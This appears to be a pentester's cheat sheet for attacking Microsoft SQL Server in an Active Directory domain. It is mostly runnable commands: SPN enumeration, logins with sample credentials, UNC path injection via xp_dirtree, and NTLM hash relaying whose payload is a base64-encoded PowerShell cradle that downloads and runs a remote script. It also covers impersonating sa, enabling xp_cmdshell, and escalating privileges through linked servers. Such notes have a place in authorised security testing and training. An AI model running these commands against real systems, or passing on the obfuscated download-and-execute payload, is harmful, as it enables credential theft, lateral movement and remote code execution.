**MSSQL Enumeration:**

In order to locate instances of MSSQL servers, we can run a network scan(port 1433/TCP) or if we are in an active directory enviromet we can query our domain DC for MSSQL SPNs. To do so, we can use the native "setspn" tool, or with [GetUsersSPNs.ps1]( https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1).

```
1. C:\> setspn -T corp1 -Q MSSQLSvc/*

2. PS C:\> .\GetUsersSPNs.ps1 
```

**CONNECTION AND AUTHENTICATION TO THE SERVER:**

Authentication to an MSSQL server, occurs in 2 stages:
  1. A login is requried. This login can be through Kerberos, or via an SQL server login which is performed with local accounts on each SQL     server.
  2. After a successfull login, the login is mapped to a database user account.

An example of this is that we may perform a SQL server login with the "sa" account, which is mapped to the "dbo" user account. However, if we perform a login with an account that doesn't has an SQL user account mapped, it will get mapped as the "guest" user. 

Generally the easiest ones to use are impacket-mssqlclient(to connect from linux) and the sqlcmd utility(to connect from windows). When using impacket-mssqlclient with active directory domain authentication don't forget the "-windows-auth" flag!

```
1. impacket-mssqlclient DOMAIN/username:password@<target-ip> -windows-auth   -> use the -windows-auth flag only if you are using a Kerberos login

~# impacket-mssqlclient -dc-ip 192.168.1.1 contoso.com/svc_sql:"SqlTest123!"@192.168.1.2 -windows-auth -> the password is only SqlTest123!, this is an example of kerberos login

~# ~# impacket-mssqlclient svc_sql:"SqlTest123!"@192.168.1.2 -> SQL server login

2. C:\> sqlcmd -S <computer_name> -U <username> -P <password>

C:\> sqlcmd -S appsrv01.contoso.com -U 'svc_sql' -P 'SqlTest123!' -> SQL server login

C:\> sqlcmd -S 192.168.1.2 -U 'svc_sql' -P 'SqlTest123!' -> SQL server login

C:\> sqlcmd -E appsrv01.contoso.com -> Kerberos login
```

IMPORTANT: Mainly all commands specified in this document are meant to be thrown through an impacket-mssqlclient or sqlcmd shell.

**UNC PATH Injection and Hash Relaying:**

Throw this command and verify that the authentication with you SMB server was successful:
```
xp_dirtree \\192.168.1.1\test\
```
You can easily create your SMB server with impacket:
```
~# impacket-smbserver test $(pwd) -smb2support
```
To relay the Net-NTLMv2 hash that you obtained with the xp_dirtree command you can use impacket-ntmlrelayx:
```
~# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
ADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='
```

**PRIVILEGE ESCALATION:**

To view the users you can impersonate:
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
To impersonate(assuming you can impersonate the sa user):
```
EXECUTE AS LOGIN = sa
```

**CODE EXECUTION(through xp_cmdshell):**

Use this commands at this order:

1st ```EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;```

2nd ```EXEC xp_cmdshell "whoami"```

**CODE EXECUTION ON A LINKED MSSQL SERVER:**

To list linked SQL servers(2 ways):
```
exec sp_linkedservers;

SELECT * FROM sys.servers;
```
For this example, assume that dc01 is the linked server. 

1st ```EXEC (sp_configure 'show advanced options', 1; RECONFIGURE;) AT dc01```

2nd ```EXEC (sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AT dc01```

3rd ```EXEC (xp_cmdshell 'whoami';) AT dc01```

**PRIVILEGE ESCALATION THROUGHA LINKED MSSQLSERVER:**

Supose that we have low privileges on our current MSSQL server, however there is a linked MSSQL server where we do have high privileges. So how do we do to gain high privileges on our first MSSQL server?
(For demonstration purposes we have low privileges on dc01 but high privileges on appsrv01)

Here are the commands we must throw through dc01:

1st ```EXEC ('EXEC (sp_configure "show advanced options", 1; reconfigure;  ) AT appsrv01') AT dc01```

2nd ```EXEC ('EXEC (sp_configure "xp_cmdshell", 1; reconfigure;) AT appsrv01') AT dc01```

3rd ```EXEC ('EXEC (xp_cmdshell "whoami";) AT appsrv01') AT dc01```



